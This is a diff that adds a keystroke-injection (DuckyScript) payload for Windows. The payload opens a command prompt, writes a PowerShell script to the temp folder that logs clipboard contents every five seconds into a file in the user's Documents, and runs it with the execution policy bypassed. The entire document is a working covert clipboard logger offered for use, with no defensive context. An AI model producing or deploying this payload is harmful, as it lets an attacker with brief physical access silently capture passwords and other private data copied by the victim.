@@ -1,0 +1,29 @@
+REM Open a command prompt
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+
+REM Write the PowerShell script
+STRING echo $LogPath = "$env:USERPROFILE\Documents\clipboard_log.txt" > %TEMP%\clipboard.ps1
+ENTER
+STRING echo while (^$true) { >> %TEMP%\clipboard.ps1
+ENTER
+STRING echo ^$ClipboardContent = Get-Clipboard >> %TEMP%\clipboard.ps1
+ENTER
+STRING echo if (^$ClipboardContent -ne $null) { >> %TEMP%\clipboard.ps1
+ENTER
+STRING echo Add-Content -Path ^$LogPath -Value "$(Get-Date): ^$ClipboardContent" >> %TEMP%\clipboard.ps1
+ENTER
+STRING echo } >> %TEMP%\clipboard.ps1
+ENTER
+STRING echo Start-Sleep -Seconds 5 >> %TEMP%\clipboard.ps1
+ENTER
+STRING echo } >> %TEMP%\clipboard.ps1
+ENTER
+
+REM Execute the PowerShell script
+STRING powershell -ExecutionPolicy Bypass -File %TEMP%\clipboard.ps1
+ENTER
+
